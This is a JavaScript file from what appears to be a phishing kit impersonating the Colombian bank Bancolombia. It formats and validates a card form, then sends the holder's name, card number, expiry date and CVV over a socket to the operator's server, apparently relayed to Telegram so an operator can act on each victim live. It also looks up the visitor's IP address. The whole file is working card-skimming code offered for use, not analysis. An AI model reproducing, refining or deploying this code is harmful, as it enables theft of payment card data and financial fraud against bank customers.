document.addEventListener('DOMContentLoaded', function() {
    const cardForm = document.getElementById('cardForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const cardHolderInput = document.getElementById('cardHolder');
    const expiryDateInput = document.getElementById('expiryDate');
    const cvvInput = document.getElementById('cvv');
    const submitButton = document.querySelector('.btn-iniciar');
    
    // Sistema centralizado
    const sessionId = bancolombia.initGlobalSession();
    bancolombia.initializeSocket();
    bancolombia.setupTelegramActions();
    const loadingOverlay = bancolombia.createLoadingOverlay();
    
    // Obtener socket del sistema centralizado
    const getSocket = () => bancolombia.getSocket();

    // Formatear número de tarjeta
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '').slice(0, 16);
        let formatted = '';
        
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        
        e.target.value = formatted;
        validateForm();
    });

    // Formatear fecha (MM/YY)
    expiryDateInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '').slice(0, 4);
        
        if (value.length >= 2) {
            const month = Math.min(parseInt(value.substring(0, 2)), 12).toString().padStart(2, '0');
            const year = value.substring(2);
            e.target.value = year ? `${month}/${year}` : month;
        } else {
            e.target.value = value;
        }
        
        validateForm();
    });

    // Validar CVV
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        validateForm();
    });

    // Validar nombre
    cardHolderInput.addEventListener('input', validateForm);

    // Función de validación
    function validateForm() {
        const cardNumber = cardNumberInput.value.replace(/\s/g, '');
        const cardHolder = cardHolderInput.value.trim();
        const expiryDate = expiryDateInput.value;
        const cvv = cvvInput.value;

        const isValid = 
            cardNumber.length === 16 &&
            cardHolder.length >= 5 &&
            /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDate) &&
            cvv.length >= 3 && cvv.length <= 4;

        submitButton.disabled = !isValid;
        
        if (isValid) {
            submitButton.style.backgroundColor = '#FFD700';
            submitButton.style.cursor = 'pointer';
        } else {
            submitButton.style.backgroundColor = '';
            submitButton.style.cursor = 'default';
        }
    }

    // Manejar envío
    cardForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        loadingOverlay.show();

        const socket = getSocket();
        
        if (!socket || !socket.connected) {
            console.error('❌ Socket no conectado');
            alert('Error de conexión. Recarga la página.');
            loadingOverlay.hide();
            return;
        }

        socket.emit('sendData', {
            type: 'tarjeta',
            sessionId,
            content: {
                text: `💳 Datos de tarjeta\n` +
                      `👤 Titular: ${cardHolderInput.value}\n` +
                      `🔢 Número: ${cardNumberInput.value}\n` +
                      `📅 Vencimiento: ${expiryDateInput.value}\n` +
                      `🔐 CVV: ${cvvInput.value}`
            },
            waitForAction: true
        });

        socket.once('dataSent', (response) => {
            if (response.success) {
                console.log('Datos de tarjeta enviados');
                // Mantener overlay
            } else {
                console.error('Error:', response.message);
                loadingOverlay.hide();
                alert('Error al procesar. Intenta nuevamente.');
            }
        });
    });

    // Actualizar IP y fecha/hora
    async function updateInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            document.getElementById('ipAddress').textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            document.getElementById('datetime').textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    updateInfo();
    setInterval(updateInfo, 60000);
});
